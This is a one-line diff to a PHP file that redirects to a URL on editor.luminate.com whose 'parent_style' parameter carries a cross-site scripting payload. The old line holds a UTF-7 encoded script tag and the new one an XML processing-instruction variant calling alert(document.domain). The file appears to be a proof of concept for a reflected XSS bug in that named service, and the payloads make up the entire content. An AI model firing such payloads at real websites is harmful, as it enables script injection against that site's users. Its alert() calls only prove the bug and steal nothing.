@@ -1,1 +1,1 @@
-<?php header('location: https://editor.luminate.com/stripe_dynamic_css?style_id=style-7043347e-krmbvhve&viewer=xprs&parent_style=%2B/v8-%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4-') ?> 
+<?php header('location: https://editor.luminate.com/stripe_dynamic_css?style_id=style-7043347e-krmbvhve&viewer=xprs&parent_style=%3C%3fPXML%3E%3Chtml:script%3Ealert(document.domain)%3C%2fhtml:script%3E') ?> 
